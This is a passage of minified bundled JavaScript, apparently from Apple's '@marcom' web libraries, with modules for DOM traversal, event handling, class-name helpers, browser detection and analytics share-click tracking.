string")}}},{"@marcom/ac-dom-nodes/COMMENT_NODE":87,"@marcom/ac-dom-nodes/DOCUMENT_FRAGMENT_NODE":88,"@marcom/ac-dom-nodes/DOCUMENT_NODE":89,"@marcom/ac-dom-nodes/ELEMENT_NODE":90,"@marcom/ac-dom-nodes/TEXT_NODE":91,"@marcom/ac-dom-nodes/isNode":97,"@marcom/ac-polyfills/Array/prototype.indexOf":198}],48:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.slice");var i=e("./internal/validate"),r=e("./shims/querySelectorAll"),o="querySelectorAll"in document;t.exports=function(e,t){return t=t||document,i.parentNode(t,!0,"querySelectorAll","context"),i.selector(e,!0,"querySelectorAll"),o?Array.prototype.slice.call(t.querySelectorAll(e)):r(e,t)}},{"./internal/validate":47,"./shims/querySelectorAll":49,"@marcom/ac-polyfills/Array/prototype.slice":203}],49:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.indexOf");var i=e("@marcom/ac-dom-nodes/isElement"),r=e("@marcom/ac-dom-nodes/isDocumentFragment"),o=e("@marcom/ac-dom-nodes/remove"),s=function(e,t){var n;if(t===document)return!0;for(n=e;(n=n.parentNode)&&i(n);)if(n===t)return!0;return!1},a=function(e){"recalc"in e?e.recalc(!1):document.recalc(!1),window.scrollBy(0,0)};t.exports=function(e,t){var n,i=document.createElement("style"),c="_ac_qsa_"+(Math.random()+"").slice(-6),l=[];for(t=t||document,document[c]=[],r(t)?t.appendChild(i):document.documentElement.firstChild.appendChild(i),i.styleSheet.cssText="*{display:recalc;}"+e+'{ac-qsa:expression(document["'+c+'"] && document["'+c+'"].push(this));}',a(t);document[c].length;)(n=document[c].shift()).style.removeAttribute("ac-qsa"),-1===l.indexOf(n)&&s(n,t)&&l.push(n);return document[c]=null,o(i),a(t),l}},{"@marcom/ac-dom-nodes/isDocumentFragment":95,"@marcom/ac-dom-nodes/isElement":96,"@marcom/ac-dom-nodes/remove":98,"@marcom/ac-polyfills/Array/prototype.indexOf":198}],50:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-object/extend"),o=e("@marcom/ac-object/create"),s=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,a=e("@marcom/ac-dom-traversal/querySelectorAll"),c=e("@marcom/ac-dom-events/addEventListener"),l=e("@marcom/ac-dom-events/removeEventListener"),u=e("@marcom/ac-console");try{i=e("@marcom/ac-analytics")}catch(e){u.log(e.message)}var h={dataAttribute:"analytics-share",interactionEvents:["click"],autoEnable:!0},d=function(e){e=e||{},this.options=r(h,e),s.call(this),this.elements=[],this.eventObserver=null,this.publishShareClick=this.publishShareClick.bind(this),this.options.autoEnable&&this.enable()},p=s.prototype,f=d.prototype=o(p);f.enable=function(){if(!i)return!1;this._createObserver(),this.bindEventListener()},f.disable=function(){if(!i)return!1;this.unbindEventListener()},f.bindEventListener=function(){var e;this.elements=this.populateElements(),e=this.elements.length;for(var t=0;t<e;t++)c(this.elements[t],"click",this.publishShareClick)},f.unbindEventListener=function(){for(var e=this.elements&&this.elements.length?this.elements.length:0,t=0;t<e;t++)l(this.elements[t],"click",this.publishShareClick)},f.populateElements=function(){return a("[data-"+this.options.dataAttribute+"]",this.options.context||document)},f.publishShareClick=function(e){var t=e.currentTarget,n=this.parseDataAttribute(t.getAttribute("data-"+this.options.dataAttribute));if("object"==typeof n){if(!n.title)return console.log("data-"+this.options.dataAttribute+" attribute must have a `title` property"),!1;this.trigger("click",n)}},f.parseDataAttribute=function(e){var t={};try{t=JSON.parse(e)}catch(e){console.log("data-"+this.options.dataAttribute+" must be a valid JSON string")}return t},f.destroy=function(){this.disable(),this.elements=[],this.eventObserver=null,this.publishShareClick=null,this.options=null},f._createObserver=function(){if(!i||!i.observer||!i.observer.Event)return!1;this.eventObserver=new i.observer.Event(this,this.options)},t.exports=d},{"@marcom/ac-analytics":void 0,"@marcom/ac-console":45,"@marcom/ac-dom-events/addEventListener":73,"@marcom/ac-dom-events/removeEventListener":77,"@marcom/ac-dom-traversal/querySelectorAll":48,"@marcom/ac-event-emitter-micro":122,"@marcom/ac-object/create":185,"@marcom/ac-object/extend":187}],51:[function(e,t,n){"use strict";var i=e("./../AnalyticsShare");t.exports=function(e){return new i(e)}},{"./../AnalyticsShare":50}],52:[function(e,t,n){"use strict";var i=e("./ac-browser/BrowserData"),r=/applewebkit/i,o=e("./ac-browser/IE"),s=i.create();s.isWebKit=function(e){var t=e||window.navigator.userAgent;return!!t&&!!r.test(t)},s.lowerCaseUserAgent=navigator.userAgent.toLowerCase(),"IE"===s.name&&(s.IE={documentMode:o.getDocumentMode()}),t.exports=s},{"./ac-browser/BrowserData":53,"./ac-browser/IE":54}],53:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.filter"),e("@marcom/ac-polyfills/Array/prototype.some");var i=e("./data");function r(){}r.prototype={__getBrowserVersion:function(e,t){var n;if(e&&t)return i.browser.filter((function(e){return e.identity===t})).some((function(i){var r=i.versionSearch||t,o=e.indexOf(r);if(o>-1)return n=parseFloat(e.substring(o+r.length+1)),!0})),n},__getName:function(e){return this.__getIdentityStringFromArray(e)},__getIdentity:function(e){return e.string?this.__matchSubString(e):e.prop?e.identity:void 0},__getIdentityStringFromArray:function(e){for(var t,n=0,i=e.length;n<i;n++)if(t=this.__getIdentity(e[n]))return t},__getOS:function(e){return this.__getIdentityStringFromArray(e)},__getOSVersion:function(e,t){if(e&&t){var n=i.os.filter((function(e){return e.identity===t}))[0].versionSearch||t,r=new RegExp(n+" ([\\d_\\.]+)","i"),o=e.match(r);return null!==o?o[1].replace(/_/g,"."):void 0}},__matchSubString:function(e){var t=e.subString;if(t&&(t.test?t.test(e.string):e.string.indexOf(t)>-1))return e.identity}},r.create=function(){var e=new r,t={};return t.name=e.__getName(i.browser),t.version=e.__getBrowserVersion(i.versionString,t.name),t.os=e.__getOS(i.os),t.osVersion=e.__getOSVersion(i.versionString,t.os),t},t.exports=r},{"./data":55,"@marcom/ac-polyfills/Array/prototype.filter":196,"@marcom/ac-polyfills/Array/prototype.some":204}],54:[function(e,t,n){"use strict";t.exports={getDocumentMode:function(){var e;return document.documentMode?e=parseInt(document.documentMode,10):(e=5,document.compatMode&&"CSS1Compat"===document.compatMode&&(e=7)),e}}},{}],55:[function(e,t,n){"use strict";t.exports={browser:[{string:window.navigator.userAgent,subString:"Edge",identity:"Edge"},{string:window.navigator.userAgent,subString:/silk/i,identity:"Silk"},{string:window.navigator.userAgent,subString:/(android).*(version\/[0-9+].[0-9+])/i,identity:"Android"},{string:window.navigator.userAgent,subString:"Chrome",identity:"Chrome"},{string:window.navigator.userAgent,subString:"OmniWeb",versionSearch:"OmniWeb/",identity:"OmniWeb"},{string:window.navigator.userAgent,subString:/mobile\/[^\s]*\ssafari\//i,identity:"Safari Mobile",versionSearch:"Version"},{string:window.navigator.vendor,subString:"Apple",identity:"Safari",versionSearch:"Version"},{prop:window.opera,identity:"Opera",versionSearch:"Version"},{string:window.navigator.vendor,subString:"iCab",identity:"iCab"},{string:window.navigator.vendor,subString:"KDE",identity:"Konqueror"},{string:window.navigator.userAgent,subString:"Firefox",identity:"Firefox"},{string:window.navigator.vendor,subString:"Camino",identity:"Camino"},{string:window.navigator.userAgent,subString:"Netscape",identity:"Netscape"},{string:window.navigator.userAgent,subString:"MSIE",identity:"IE",versionSearch:"MSIE"},{string:window.navigator.userAgent,subString:"Trident",identity:"IE",versionSearch:"rv"},{string:window.navigator.userAgent,subString:"Gecko",identity:"Mozilla",versionSearch:"rv"},{string:window.navigator.userAgent,subString:"Mozilla",identity:"Netscape",versionSearch:"Mozilla"}],os:[{string:window.navigator.platform,subString:"Win",identity:"Windows",versionSearch:"Windows NT"},{string:window.navigator.platform,subString:"Mac",identity:"OS X"},{string:window.navigator.userAgent,subString:"iPhone",identity:"iOS",versionSearch:"iPhone OS"},{string:window.navigator.userAgent,subString:"iPad",identity:"iOS",versionSearch:"CPU OS"},{string:window.navigator.userAgent,subString:/android/i,identity:"Android"},{string:window.navigator.platform,subString:"Linux",identity:"Linux"}],versionString:window.navigator.userAgent||window.navigator.appVersion||void 0}},{}],56:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.slice"),e("@marcom/ac-polyfills/Element/prototype.classList");var i=e("./className/add");t.exports=function(){var e,t=Array.prototype.slice.call(arguments),n=t.shift(t);if(n.classList&&n.classList.add)n.classList.add.apply(n.classList,t);else for(e=0;e<t.length;e++)i(n,t[e])}},{"./className/add":58,"@marcom/ac-polyfills/Array/prototype.slice":203,"@marcom/ac-polyfills/Element/prototype.classList":211}],57:[function(e,t,n){"use strict";t.exports={add:e("./className/add"),contains:e("./className/contains"),remove:e("./className/remove")}},{"./className/add":58,"./className/contains":59,"./className/remove":61}],58:[function(e,t,n){"use strict";var i=e("./contains");t.exports=function(e,t){i(e,t)||(e.className+=" "+t)}},{"./contains":59}],59:[function(e,t,n){"use strict";var i=e("./getTokenRegExp");t.exports=function(e,t){return i(t).test(e.className)}},{"./getTokenRegExp":60}],60:[function(e,t,n){"use strict";t.exports=function(e){return new RegExp("(\\s|^)"+e+"(\\s|$)")}},{}],61:[function(e,t,n){"use strict";var i=e("./contains"),r=e("./getTokenRegExp");t.exports=function(e,t){i(e,t)&&(e.className=e.className.replace(r(t),"$1").trim())}},{"./contains":59,"./getTokenRegExp":60}],62:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Element/prototype.classList");var i=e("./className/contains");t.exports=function(e,t){return e.classList&&e.classList.contains?e.classList.contains(t):i(e,t)}},{"./className/contains":59,"@marcom/ac-polyfills/Element/prototype.classList":211}],63:[function(e,t,n){"use strict";t.exports={add:e("./add"),contains:e("./contains"),remove:e("./remove"),toggle:e("./toggle")}},{"./add":56,"./contains":62,"./remove":64,"./toggle":65}],64:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.slice"),e("@marcom/ac-polyfills/Element/prototype.classList");var i=e("./className/remove");t.exports=function(){var e,t=Array.prototype.slice.call(arguments),n=t.shift(t);if(n.classList&&n.classList.remove)n.classList.remove.apply(n.classList,t);else for(e=0;e<t.length;e++)i(n,t[e])}},{"./className/remove":61,"@marcom/ac-polyfills/Array/prototype.slice":203,"@marcom/ac-polyfills/Element/prototype.classList":211}],65:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Element/prototype.classList");var i=e("./className");t.exports=function(e,t,n){var r,o=void 0!==n;return e.classList&&e.classList.toggle?o?e.classList.toggle(t,n):e.classList.toggle(t):((r=o?!!n:!i.contains(e,t))?i.add(e,t):i.remove(e,t),r)}},{"./className":57,"@marcom/ac-polyfills/Element/prototype.classList":211}],66:[function(e,t,n){"use strict";t.exports=function(e){if("function"==typeof e.select)e.select()||e.setSelectionRange(0,e.value.length);else{var t=document.createRange();t.selectNodeContents(e);var n=window.getSelection();n.removeAllRanges(),n.addRange(t)}}},{}],67:[function(e,t,n){"use strict";var i=!1,r=window||self;try{i=!!r.localStorage.getItem("f7c9180f-5c45-47b4-8de4-428015f096c0")}catch(e){}t.exports=i},{}],68:[function(e,t,n){"use strict";var i=e("../enabled");t.exports=function(e){return function(){if(i&&"object"==typeof window.console&&"function"==typeof console[e])return console[e].apply(console,Array.prototype.slice.call(arguments,0))}}},{"../enabled":67}],69:[function(e,t,n){"use strict";t.exports=e("./internal/expose")("log")},{"./internal/expose":68}],70:[function(e,t,n){"use strict";t.exports={DOMEmitter:e("./ac-dom-emitter/DOMEmitter")}},{"./ac-dom-emitter/DOMEmitter":71}],71:[function(e,t,n){"use strict";var i,r=e("ac-event-emitter").EventEmitter,o=e("./DOMEmitterEvent"),s={addEventListener:e("@marcom/ac-dom-events/addEventListener"),removeEventListener:e("@marcom/ac-dom-events/removeEventListener"),dispatchEvent:e("@marcom/ac-dom-events/dispatchEvent")},a={querySelectorAll:e("@marcom/ac-dom-traversal/querySelectorAll"),matchesSelector:e("@marcom/ac-dom-traversal/matchesSelector")};function c(e){null!==e&&(this.el=e,this._bindings={},this._delegateFuncs={},this._eventEmitter=new r)}(i=c.prototype).on=function(){return this._normalizeArgumentsAndCall(Array.prototype.slice.call(arguments,0),this._on),this},i.once=function(){return this._normalizeArgumentsAndCall(Array.prototype.slice.call(arguments,0),this._once),this},i.off=function(){return this._normalizeArgumentsAndCall(Array.prototype.slice.call(arguments,0),this._off),this},i.has=function(e,t,n,i){var r,o;if("string"==typeof t?(r=t,o=n):(o=t,i=n),r){var s=this._getDelegateFuncBindingIdx(e,r,o,i,!0);return s>-1}return!(!this._eventEmitter||!this._eventEmitter.has.apply(this._eventEmitter,arguments))},i.trigger=function(e,t,n,i){e=this._parseEventNames(e);var r,o,s,a=(e=this._cleanStringData(e)).length;for("string"==typeof t?(r=this._cleanStringData(t),o=n):o=t,s=0;s<a;s++)this._triggerDOMEvents(e[s],o,r);return this},i.emitterTrigger=function(e,t,n){if(!this._eventEmitter)return this;e=this._parseEventNames(e),e=this._cleanStringData(e),t=new o(t,this);var i,r=e.length;for(i=0;i<r;i++)this._eventEmitter.trigger(e[i],t,n);return this},i.propagateTo=function(e,t){return this._eventEmitter.propagateTo(e,t),this},i.stopPropagatingTo=function(e){return this._eventEmitter.stopPropagatingTo(e),this},i.stopImmediatePropagation=function(){return this._eventEmitter.stopImmediatePropagation(),this},i.destroy=function(){var e;for(e in this._triggerInternalEvent("willdestroy"),this.off(),this)this.hasOwnProperty(e)&&(this[e]=null)},i._parseEventNames=function(e){return e?e.split(" "):[e]},i._onListenerEvent=function(e,t){var n=new o(t,this);this._eventEmitter.trigger(e,n,!1)},i._setListener=function(e){this._bindings[e]=this._onListenerEvent.bind(this,e),s.addEventListener(this.el,e,this._bindings[e])},i._removeListener=function(e){s.removeEventListener(this.el,e,this._bindings[e]),this._bindings[e]=null},i._triggerInternalEvent=function(e,t){this.emitterTrigger("dom-emitter:"+e,t)},i._normalizeArgumentsAndCall=function(e,t){var n={};if(0!==e.length){if("string"==typeof e[0]||null===e[0])return e=this._cleanStringData(e),n.events=e[0],"string"==typeof e[1]?(n.delegateQuery=e[1],n.callback=e[2],n.context=e[3]):(n.callback=e[1],n.context=e[2]),void t.call(this,n);var i,r,o=e[0];for(i in o)o.hasOwnProperty(i)&&(n={},r=this._cleanStringData(i.split(":")),n.events=r[0],n.delegateQuery=r[1],n.callback=o[i],n.context=e[1],t.call(this,n))}else t.call(this,n)},i._registerDelegateFunc=function(e,t,n,i,r){var o=this._delegateFunc.bind(this,e,t,n,r);return this._delegateFuncs[t]=this._delegateFuncs[t]||{},this._delegateFuncs[t][e]=this._delegateFuncs[t][e]||[],this._delegateFuncs[t][e].push({func:i,context:r,delegateFunc:o}),o},i._cleanStringData=function(e){var t=!1;"string"==typeof e&&(e=[e],t=!0);var n,i,r,o=[],s=e.length;for(n=0;n<s;n++){if("string"==typeof(i=e[n])){if(""===i||" "===i)continue;for(r=i.length;" "===i[0];)i=i.slice(1,r),r--;for(;" "===i[r-1];)i=i.slice(0,r-1),r--}o.push(i)}return t?o[0]:o},i._unregisterDelegateFunc=function(e,t,n,i){if(this._delegateFuncs[t]&&this._delegateFuncs[t][e]){var r,o=this._getDelegateFuncBindingIdx(e,t,n,i);return o>-1&&(r=this._delegateFuncs[t][e][o].delegateFunc,this._delegateFuncs[t][e].splice(o,1),0===this._delegateFuncs[t][e].length&&(this._delegateFuncs[t][e]=null)),r}},i._unregisterDelegateFuncs=function(e,t){var n;if(this._delegateFuncs[t]&&(null===e||this._delegateFuncs[t][e]))if(null!==e)this._unbindDelegateFunc(e,t);else for(n in this._delegateFuncs[t])this._delegateFuncs[t].hasOwnProperty(n)&&this._unbindDelegateFunc(n,t)},i._unbindDelegateFunc=function(e,t){for(var n,i,r=0;this._delegateFuncs[t][e]&&this._delegateFuncs[t][e][r];)n=this._delegateFuncs[t][e][r],i=this._delegateFuncs[t][e][r].length,this._off({events:e,delegateQuery:t,callback:n.func,context:n.context}),this._delegateFuncs[t][e]&&i===this._delegateFuncs[t][e].length&&r++;n=i=null},i._unregisterDelegateFuncsByEvent=function(e){var t;for(t in this._delegateFuncs)this._delegateFuncs.hasOwnProperty(t)&&this._unregisterDelegateFuncs(e,t)},i._delegateFunc=function(e,t,n,i,r){if(this._targetHasDelegateAncestor(r.target,t)){var o=Array.prototype.slice.call(arguments,0),s=o.slice(4,o.length);i=i||window,"object"==typeof r.detail&&(s[0]=r.detail),n.apply(i,s)}},i._targetHasDelegateAncestor=function(e,t){for(var n=e;n&&n!==this.el&&n!==document.documentElement;){if(a.matchesSelector(n,t))return!0;n=n.parentNode}return!1},i._on=function(e){var t=e.events,n=e.callback,i=e.delegateQuery,r=e.context,o=e.unboundCallback||n;(t=this._parseEventNames(t)).forEach(function(e,t,n,i,r){this.has(r)||this._setListener(r),"string"==typeof i&&(e=this._registerDelegateFunc(r,i,e,t,n)),this._triggerInternalEvent("willon",{evt:r,callback:e,context:n,delegateQuery:i}),this._eventEmitter.on(r,e,n),this._triggerInternalEvent("didon",{evt:r,callback:e,context:n,delegateQuery:i})}.bind(this,n,o,r,i)),t=n=o=i=r=null},i._off=function(e){var t=e.events,n=e.callback,i=e.delegateQuery,r=e.context,o=e.unboundCallback||n;if(void 0!==t)(t=this._parseEventNames(t)).forEach(function(e,t,n,i,r){("string"!=typeof i||"function"!=typeof t||(e=this._unregisterDelegateFunc(r,i,t,n)))&&("string"!=typeof i||void 0!==e?"string"==typeof r&&void 0===e&&(this._unregisterDelegateFuncsByEvent(r),"string"==typeof i)||(this._triggerInternalEvent("willoff",{evt:r,callback:e,context:n,delegateQuery:i}),this._eventEmitter.off(r,e,n),this._triggerInternalEvent("didoff",{evt:r,callback:e,context:n,delegateQuery:i}),this.has(r)||this._removeListener(r)):this._unregisterDelegateFuncs(r,i))}.bind(this,n,o,r,i)),t=n=o=i=r=null;else{var s;for(s in this._eventEmitter.off(),this._bindings)this._bindings.hasOwnProperty(s)&&this._removeListener(s);for(s in this._delegateFuncs)this._delegateFuncs.hasOwnProperty(s)&&(this._delegateFuncs[s]=null)}},i._once=function(e){var t=e.events,n=e.callback,i=e.delegateQuery,r=e.context;(t=this._parseEventNames(t)).forEach(function(e,t,n,i){if("string"==typeof n)return this._handleDelegateOnce(i,e,t,n);this.has(i)||this._setListener(i),this._triggerInternalEvent("willonce",{evt:i,callback:e,context:t,delegateQuery:n}),this._eventEmitter.once.call(this,i,e,t),this._triggerInternalEvent("didonce",{evt:i,callback:e,context:t,delegateQuery:n})}.bind(this,n,r,i)),t=n=i=r=null},i._handleDelegateOnce=function(e,t,n,i){return this._triggerInternalEvent("willonce",{evt:e,callback:t,context:n,delegateQuery:i}),this._on({events:e,context:n,delegateQuery:i,callback:this._getDelegateOnceCallback.bind(this,e,t,n,i),unboundCallback:t}),this._triggerInternalEvent("didonce",{evt:e,callback:t,context:n,delegateQuery:i}),this},i._getDelegateOnceCallback=function(e,t,n,i){var r=Array.prototype.slice.call(arguments,0),o=r.slice(4,r.length);t.apply(n,o),this._off({events:e,delegateQuery:i,callback:t,context:n})},i._getDelegateFuncBindingIdx=function(e,t,n,i,r){var o=-1;if(this._delegateFuncs[t]&&this._delegateFuncs[t][e]){var s,a,c=this._delegateFuncs[t][e].length;for(s=0;s<c;s++)if(a=this._delegateFuncs[t][e][s],r&&void 0===n&&(n=a.func),a.func===n&&a.context===i){o=s;break}}return o},i._triggerDOMEvents=function(e,t,n){var i=[this.el];n&&(i=a.querySelectorAll(n,this.el));var r,o=i.length;for(r=0;r<o;r++)s.dispatchEvent(i[r],e,{bubbles:!0,cancelable:!0,detail:t})},t.exports=c},{"./DOMEmitterEvent":72,"@marcom/ac-dom-events/addEventListener":73,"@marcom/ac-dom-events/dispatchEvent":74,"@marcom/ac-dom-events/removeEventListener":77,"@marcom/ac-dom-traversal/matchesSelector":108,"@marcom/ac-dom-traversal/querySelectorAll":114,"ac-event-emitter":446}],72:[function(e,t,n){"use strict";var i,r={preventDefault:e("@marcom/ac-dom-events/preventDefault"),stopPropagation:e("@marcom/ac-dom-events/stopPropagation"),target:e("@marcom/ac-dom-events/target")},o=function(e,t){this._domEmitter=t,this.originalEvent=e||{},this._originalTarget=r.target(this.originalEvent),this.target=this._originalTarget||this._domEmitter.el,this.currentTarget=this._domEmitter.el,this.timeStamp=this.originalEvent.timeStamp||Date.now(),this._isDOMEvent(this.originalEvent)?"object"==typeof this.originalEvent.detail&&(this.data=this.originalEvent.detail):e&&(this.data=this.originalEvent,this.originalEvent={})};(i=o.prototype).preventDefault=function(){r.preventDefault(this.originalEvent)},i.stopPropagation=function(){r.stopPropagation(this.originalEvent)},i.stopImmediatePropagation=function(){this.originalEvent.stopImmediatePropagation&&this.originalEvent.stopImmediatePropagation(),this._domEmitter.stopImmediatePropagation()},i._isDOMEvent=function(e){return!!(this._originalTarget||"undefined"!==document.createEvent&&"undefined"!=typeof CustomEvent&&e instanceof CustomEvent)},t.exports=o},{"@marcom/ac-dom-events/preventDefault":76,"@marcom/ac-dom-events/stopPropagation":80,"@marcom/ac-dom-events/target":81}],73:[function(e,t,n){"use strict";var i=e("./utils/addEventListener"),r=e("./shared/getEventType");t.exports=function(e,t,n,o){return t=r(e,t),i(e,t,n,o)}},{"./shared/getEventType":78,"./utils/addEventListener":82}],74:[function(e,t,n){"use strict";var i=e("./utils/dispatchEvent"),r=e("./shared/getEventType");t.exports=function(e,t,n){return t=r(e,t),i(e,t,n)}},{"./shared/getEventType":78,"./utils/dispatchEvent":83}],75:[function(e,t,n){"use strict";t.exports={addEventListener:e("./addEventListener"),dispatchEvent:e("./dispatchEvent"),preventDefault:e("./preventDefault"),removeEventListener:e("./removeEventListener"),stop:e("./stop"),stopPropagation:e("./stopPropagation"),target:e("./target")}},{"./addEventListener":73,"./dispatchEvent":74,"./preventDefault":76,"./removeEventListener":77,"./stop":79,"./stopPropagation":80,"./target":81}],76:[function(e,t,n){"use strict";t.exports=function(e){(e=e||window.event).preventDefault?e.preventDefault():e.returnValue=!1}},{}],77:[function(e,t,n){"use strict";var i=e("./utils/removeEventListener"),r=e("./shared/getEventType");t.exports=function(e,t,n,o){return t=r(e,t),i(e,t,n,o)}},{"./shared/getEventType":78,"./utils/removeEventListener":84}],78:[function(e,t,n){"use strict";var i=e("@marcom/ac-prefixer/getEventType");t.exports=function(e,t){var n;return n="tagName"in e?e.tagName:e===window?"window":"document",i(t,n)||t}},{"@marcom/ac-prefixer/getEventType":230}],79:[function(e,t,n){"use strict";var i=e("./stopPropagation"),r=e("./preventDefault");t.exports=function(e){e=e||window.event,i(e),r(e),e.stopped=!0,e.returnValue=!1}},{"./preventDefault":76,"./stopPropagation":80}],80:[function(e,t,n){"use strict";t.exports=function(e){(e=e||window.event).stopPropagation?e.stopPropagation():e.cancelBubble=!0}},{}],81:[function(e,t,n){"use strict";t.exports=function(e){return void 0!==(e=e||window.event).target?e.target:e.srcElement}},{}],82:[function(e,t,n){"use strict";t.exports=function(e,t,n,i){return e.addEventListener?e.addEventListener(t,n,!!i):e.attachEvent("on"+t,n),e}},{}],83:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/CustomEvent"),t.exports=function(e,t,n){var i;return e.dispatchEvent?(i=n?new CustomEvent(t,n):new CustomEvent(t),e.dispatchEvent(i)):(i=document.createEventObject(),n&&"detail"in n&&(i.detail=n.detail),e.fireEvent("on"+t,i)),e}},{"@marcom/ac-polyfills/CustomEvent":205}],84:[function(e,t,n){"use strict";t.exports=function(e,t,n,i){return e.removeEventListener?e.removeEventListener(t,n,!!i):e.detachEvent("on"+t,n),e}},{}],85:[function(e,t,n){"use strict";t.exports=function(e){var t;if((e=e||window)===window){if(t=window.pageXOffset)return t;e=document.documentElement||document.body.parentNode||document.body}return e.scrollLeft}},{}],86:[function(e,t,n){"use strict";t.exports=function(e){var t;if((e=e||window)===window){if(t=window.pageYOffset)return t;e=document.documentElement||document.body.parentNode||document.body}return e.scrollTop}},{}],87:[function(e,t,n){"use strict";t.exports=8},{}],88:[function(e,t,n){"use strict";t.exports=11},{}],89:[function(e,t,n){"use strict";t.exports=9},{}],90:[function(e,t,n){"use strict";t.exports=1},{}],91:[function(e,t,n){"use strict";t.exports=3},{}],92:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.slice"),e("@marcom/ac-polyfills/Array/prototype.filter");var i=e("./internal/isNodeType"),r=e("./ELEMENT_NODE");t.exports=function(e,t){return t=t||r,(e=Array.prototype.slice.call(e)).filter((function(e){return i(e,t)}))}},{"./ELEMENT_NODE":90,"./internal/isNodeType":93,"@marcom/ac-polyfills/Array/prototype.filter":196,"@marcom/ac-polyfills/Array/prototype.slice":203}],93:[function(e,t,n){"use strict";var i=e("../isNode");t.exports=function(e,t){return!!i(e)&&("number"==typeof t?e.nodeType===t:-1!==t.indexOf(e.nodeType))}},{"../isNode":97}],94:[function(e,t,n){"use strict";var i=e("./isNodeType"),r=e("../COMMENT_NODE"),o=e("../DOCUMENT_FRAGMENT_NODE"),s=e("../ELEMENT_NODE"),a=e("../TEXT_NODE"),c=[s,a,r,o],l=[s,a,r],u=[s,o];t.exports={parentNode:function(e,t,n,r){if(r=r||"target",(e||t)&&!i(e,u))throw new TypeError(n+": "+r+" must be an Element, or Document Fragment")},childNode:function(e,t,n,r){if(r=r||"target",(e||t)&&!i(e,l))throw new TypeError(n+": "+r+" must be an Element, TextNode, or Comment")},insertNode:function(e,t,n,r){if(r=r||"node",(e||t)&&!i(e,c))throw new TypeError(n+": "+r+" must be an Element, TextNode, Comment, or Document Fragment")},hasParentNode:function(e,t,n){if(n=n||"target",!e.parentNode)throw new TypeError(t+": "+n+" must have a parentNode")}}},{"../COMMENT_NODE":87,"../DOCUMENT_FRAGMENT_NODE":88,"../ELEMENT_NODE":90,"../TEXT_NODE":91,"./isNodeType":93}],95:[function(e,t,n){"use strict";var i=e("./internal/isNodeType"),r=e("./DOCUMENT_FRAGMENT_NODE");t.exports=function(e){return i(e,r)}},{"./DOCUMENT_FRAGMENT_NODE":88,"./internal/isNodeType":93}],96:[function(e,t,n){"use strict";var i=e("./internal/isNodeType"),r=e("./ELEMENT_NODE");t.exports=function(e){return i(e,r)}},{"./ELEMENT_NODE":90,"./internal/isNodeType":93}],97:[function(e,t,n){"use strict";t.exports=function(e){return!(!e||!e.nodeType)}},{}],98:[function(e,t,n){"use strict";var i=e("./internal/validate");t.exports=function(e){return i.childNode(e,!0,"remove"),e.parentNode?e.parentNode.removeChild(e):e}},{"./internal/validate":94}],99:[function(e,t,n){"use strict";t.exports={ancestor:e("./ancestor"),ancestors:e("./ancestors"),children:e("./children"),filterBySelector:e("./filterBySelector"),firstChild:e("./firstChild"),lastChild:e("./lastChild"),matchesSelector:e("./matchesSelector"),nextSibling:e("./nextSibling"),nextSiblings:e("./nextSiblings"),previousSibling:e("./previousSibling"),previousSiblings:e("./previousSiblings"),querySelector:e("./querySelector"),querySelectorAll:e("./querySelectorAll"),siblings:e("./siblings")}},{"./ancestor":100,"./ancestors":101,"./children":102,"./filterBySelector":103,"./firstChild":104,"./lastChild":107,"./matchesSelector":108,"./nextSibling":109,"./nextSiblings":110,"./previousSibling":111,"./previousSiblings":112,"./querySelector":113,"./querySelectorAll":114,"./siblings":118}],100:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isElement"),r=e("./matchesSelector"),o=e("./internal/validate");t.exports=function(e,t,n){if(o.childNode(e,!0,"ancestors"),o.selector(t,!1,"ancestors"),n&&i(e)&&(!t||r(e,t)))return e;if(e!==document.body)for(;(e=e.parentNode)&&i(e);){if(!t||r(e,t))return e;if(e===document.body)break}return null}},{"./internal/validate":106,"./matchesSelector":108,"@marcom/ac-dom-nodes/isElement":96}],101:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/isElement"),r=e("./matchesSelector"),o=e("./internal/validate");t.exports=function(e,t,n){var s=[];if(o.childNode(e,!0,"ancestors"),o.selector(t,!1,"ancestors"),n&&i(e)&&(!t||r(e,t))&&s.push(e),e!==document.body)for(;(e=e.parentNode)&&i(e)&&(t&&!r(e,t)||s.push(e),e!==document.body););return s}},{"./internal/validate":106,"./matchesSelector":108,"@marcom/ac-dom-nodes/isElement":96}],102:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-nodes/filterByNodeType"),r=e("./filterBySelector"),o=e("./internal/validate");t.exports=function(e,t){var n;return o.parentNode(e,!0,"children"),o.selector(t,!1,"children"),n=e.children||e.childNodes,n=i(n),t&&(n=r(n,t)),n}},{"./filterBySelector":103,"./internal/validate":106,"@marcom/ac-dom-nodes/filterByNodeType":92}],103:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.slice"),e("@marcom/ac-polyfills/Array/prototype.filter");var i=e("./matchesSelector"),r=e("./internal/validate");t.exports=function(e,t){return r.selector(t,!0,"filterBySelector"),(e=Array.prototype.slice.call(e)).filter((function(e){return i(e,t)}))}},{"./internal/validate":106,"./matchesSelector":108,"@marcom/ac-polyfills/Array/prototype.filter":196,"@marcom/ac-polyfills/Array/prototype.slice":203}],104:[function(e,t,n){"use strict";var i=e("./children"),r=e("./internal/validate");t.exports=function(e,t){var n;return r.parentNode(e,!0,"firstChild"),r.selector(t,!1,"firstChild"),e.firstElementChild&&!t?e.firstElementChild:(n=i(e,t)).length?n[0]:null}},{"./children":102,"./internal/validate":106}],105:[function(e,t,n){"use strict";var i;t.exports=window.Element?(i=Element.prototype).matches||i.matchesSelector||i.webkitMatchesSelector||i.mozMatchesSelector||i.msMatchesSelector||i.oMatchesSelector:null},{}],106:[function(e,t,n){"use strict";e("@marcom/ac-polyfills/Array/prototype.indexOf");var 